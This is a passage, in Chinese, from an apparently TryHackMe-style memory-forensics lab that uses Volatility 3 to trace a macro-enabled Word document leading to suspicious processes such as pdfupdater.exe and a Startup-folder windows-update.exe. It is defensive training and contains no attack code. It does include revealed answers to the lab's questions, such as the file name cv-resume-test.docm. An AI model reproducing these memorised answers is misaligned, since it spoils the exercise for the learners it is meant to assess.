class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> a2 0b </span><span class="token number" style="color:#36acaa">17</span><span class="token plain">                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">%</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A</span><br></span></code></pre></div></div>
<p>如上所示，来自操作员用户注册表配置单元的UserAssist数据揭示了与我们怀疑的攻击链一致的关键应用程序的执行情况。 值得注意的是，引用<strong>Command Prompt.lnk</strong>的条目显示在<strong>07:12:43</strong>左右的活动，这与会话数据中看到的<strong>cmd.exe</strong>启动直接对应。 这进一步证实了用户或通过其会话进行攻击的攻击者在执行可疑进程（如<strong>WINWORD.EXE</strong>、pdfupdater.exe和updater.exe）之前或期间与系统进行了交互。 这些痕迹有助于确认与入侵相关的操作是从一个活跃的桌面会话启动的，表明这是有意的、由用户驱动的执行。</p>
<p>很好，既然我们已经学习了如何从会话中获取信息，让我们继续下一个任务。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 应该使用哪个插件来从内存中识别用户登录会话？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.sessions</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 当WINWORD.EXE和updater.exe执行时，哪个用户登录到了控制台会话？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DESKTOP-3NMNM0H/operator</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 根据UserAssist数据，哪个与命令行活动相关的可执行文件是通过快捷方式启动的？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmd.exe</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 哪个Volatility 3插件揭示了用户通过图形界面启动程序的证据？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.registry.userassist</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务5-命令执行与文件访问">任务5 命令执行与文件访问<a href="#任务5-命令执行与文件访问" class="hash-link" aria-label="任务5 命令执行与文件访问的直接链接" title="任务5 命令执行与文件访问的直接链接" translate="no">​</a></h2>
<p>既然我们已经看到了可能的恶意活动是如何开始的，现在是时候检查之后发生了什么。 我们将调查命令执行情况，并识别攻击序列中涉及的任何进程访问了哪些文件。</p>
<p>我们已经确定执行始于<strong>WINWORD.EXE</strong>并导致了updater.exe。 我们现在的目标是确定这些组件中是否有任何一个执行了命令、通过控制台与系统交互，或者访问了可能已暂存或收集的文件。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="执行">执行<a href="#执行" class="hash-link" aria-label="执行的直接链接" title="执行的直接链接" translate="no">​</a></h3>
<p>让我们首先使用Volatility的<strong>cmdline</strong>插件来检查获取内存转储时执行的命令或程序。 cmdline插件的工作原理是遍历内存中的每个进程并访问每个进程环境块（<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank" rel="noopener noreferrer" class="">PEB</a>）。 在<strong>PEB</strong>内部，有一个名为<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank" rel="noopener noreferrer" class="">ProcessParameters</a>的结构，它包含一个指向用于启动进程的命令行Unicode字符串的指针。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_RTL_USER_PROCESS_PARAMETERS</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BYTE           Reserved1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID          Reserved2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNICODE_STRING ImagePathName</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNICODE_STRING CommandLine</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// This is the string it reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RTL_USER_PROCESS_PARAMETERS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">PRTL_USER_PROCESS_PARAMETERS</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>该插件直接从内存中读取此字符串。 让我们使用上述插件通过以下命令调查进程和文件执行情况：</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem windows.cmdline  &gt; cmdline.txt</code></p>
<p>上述命令将把命令的输出保存到文件<strong>cmdline.txt</strong>中。 我们可以分析它以寻找可疑信息。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> cmdline.txt </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PID    Process    Args</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">    System    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">92</span><span class="token plain">    Registry    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">324</span><span class="token plain">    smss.exe    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SystemRoot</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">smss.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6964</span><span class="token plain">    audiodg.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AUDIODG.EXE 0x2fc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot;</span><span class="token plain"> /n </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\Documents\[REDACTED].docm&quot;</span><span class="token plain"> /o </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2404</span><span class="token plain">    svchost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> LocalSystemNetworkRestricted </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> PcaSvc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2072</span><span class="token plain">    svchost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> LocalSystemNetworkRestricted </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> WdiSystemHost</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2232</span><span class="token plain">    SearchProtocol    </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\system32\SearchProtocolHost.exe&quot;</span><span class="token plain"> Global</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsGthrFltPipeMssGthrPipe1_ Global</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsGthrCtrlFltPipeMssGthrPipe1 </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-2147483646</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Software\Microsoft\Windows Search&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;DownLevelDaemon&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3392</span><span class="token plain">    pdfupdater.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">pdfupdater.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3932</span><span class="token plain">    ai.exe    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office</span><span class="token string entity" style="color:#36acaa">\r</span><span class="token string" style="color:#e3116c">oot</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">fs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI</span><span class="token string entity" style="color:#36acaa">\a</span><span class="token string" style="color:#e3116c">i.exe&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;800FB58E-123D-47C9-86F8-DBF71EE67997&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;B1B0FF84-8895-409C-B3BB-2C4A4087BED6&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;5252&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;WordCombinedFloatieLreOnline.onnx&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2576</span><span class="token plain">    conhost.exe    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">conhost.exe 0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">10084</span><span class="token plain">    windows-update    </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-update.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7788</span><span class="token plain">    FTK Imager.exe    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files\AccessData\FTK Imager\FTK Imager.exe&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">9920</span><span class="token plain">    dllhost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">DllHost.exe /Processid:</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">AB8902B4-09CA-4BB6-B78D-A8F59079A8D5</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5108</span><span class="token plain">    svchost.exe</span><br></span></code></pre></div></div>
<p>我们可以观察到，没有一个潜在的恶意进程是使用命令执行的，但我们可以观察并确认进程<strong>5252</strong>对应的<strong>WINWORD.EXE</strong>被执行以打开一个<strong>docm</strong>文件（实际上，该文件可能是用户点击或打开的），如下所示：</p>
<p><code>5252    WINWORD.EXE    &quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot; /n &quot;C:\Users\operator\Documents\[REDACTED].docm&quot; /o &quot;&quot;</code></p>
<p>这表明<code>WINWORD.EXE</code>是使用<code>.docm</code>文件（一个启用宏的文档）启动的。 使用<code>/n</code>表示启动了一个新实例，这通常用于避免重用现有窗口。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="文件访问">文件访问<a href="#文件访问" class="hash-link" aria-label="文件访问的直接链接" title="文件访问的直接链接" translate="no">​</a></h3>
<p>我们可以通过使用handles插件查看此文件的句柄来确认上述情况，该插件通过解析每个进程的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess" target="_blank" rel="noopener noreferrer" class="">EPROCESS</a>结构中的<code>ObjectTable</code>字段引用的句柄表来提取打开的句柄。 每个条目映射到一个内核对象（文件、注册表键、事件等），插件遍历该表以解释它们。 这揭示了在内存转储时每个进程打开了哪些资源。</p>
<p>让我们尝试使用以下命令：</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem windows.handles &gt; handles.txt</code></p>
<p>现在让我们检查保存输出的<strong>handles.txt</strong>的内容。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> handles.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> WINWORD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0xbe8c69e24e20    0xd00    Key    0x20019    MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CLASSES</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">WOW6432NODE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CLSID</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">76765B11-3F95-4AF2-AC9D-EA55D8994F1A</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b29014c60    0xd04    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a55e0    0xd0c    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a56e0    0xd10    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a5760    0xd14    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b265ae590    0xd18    WaitCompletionPacket    0x1    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2a79ae30    0xd1c    File    0x100001    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">KsecDD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2ae08c20    0xd20    File    0x100001    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">HarddiskVolume3</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">en-US</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">propsys.dll.mui</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0xbe8c69f5ff10    0xd24    Section    0x4    C:*ProgramData*Microsoft*Windows*Caches*</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">DDF571F2-BE98-426D-8288-1A9A39C3FDA2</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">.2.ver0x0000000000000003.db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2a57ad90    0xd2c    ALPC Port    0x1f0001    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2ae0ab60    0xd30    File    0x12019f    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">HarddiskVolume3</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Documents</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">.docm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b29d9cf60    0xd34    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p><strong>注意</strong>：此命令可能需要几分钟才能执行。</p>
<p>正如我们所见，该进程在<code>\Device\HarddiskVolume3\Users\operator\Documents\[REDACTED].docm</code>处打开或执行了该文件。 这表明该文件不仅仅是作为参数传递的。 它被进程主动打开了。 这为将此文档与后续活动联系起来提供了依据。</p>
<p>此时，为了获取更多关于发生了什么的信息，我们需要检查进程<code>WINWORD.EXE</code>，如果我们想有机会恢复关于此进程的更多信息。 我们将在下一个任务中完成此操作。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 哪个文件被传递给了WINWORD.EXE？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cv-resume-test.docm</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 从进程句柄表中提取打开的文件、注册表键和内核对象的Volatility3插件叫什么名字？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.handles</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 在WINWORD.EXE的内存空间中，发现.docm文件打开的完整设备路径是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\operator\Documents\cv-resume-test.docm</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 使用了哪个Windows命令行开关在新实例中打开WINWORD.EXE？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/n</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务6-追踪用户执行">任务6 追踪用户执行<a href="#任务6-追踪用户执行" class="hash-link" aria-label="任务6 追踪用户执行的直接链接" title="任务6 追踪用户执行的直接链接" translate="no">​</a></h2>
<p>在调查的这一部分，我们将重新审视可能由同一个Word进程使用的模板文件。 这些模板通常包含嵌入的宏，并随启用宏的文档自动加载。 我们已经在之前的步骤中提取了此文件，但我们将在此处确认其类型并进行分析。 目标是检查此文件是否在触发进一步活动中发挥了作用。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="定位模板文件">定位模板文件<a href="#定位模板文件" class="hash-link" aria-label="定位模板文件的直接链接" title="定位模板文件的直接链接" translate="no">​</a></h3>
<p>要转储进程加载或使用的文件，或进程本身，我们可以使用Volatility的<strong>dumpfiles</strong>插件，该插件提取在获取时存在于系统内存中的文件对象。 它的工作原理是通过扫描内存中的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object" target="_blank" rel="noopener noreferrer" class="">FILE_OBJECT</a>结构，这些结构表示打开或最近访问的文件。 对于找到的每个有效文件对象，插件尝试跟随关联的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers" target="_blank" rel="noopener noreferrer" class="">SectionObjectPointer</a>来定位并重建内存中映射的文件数据。</p>
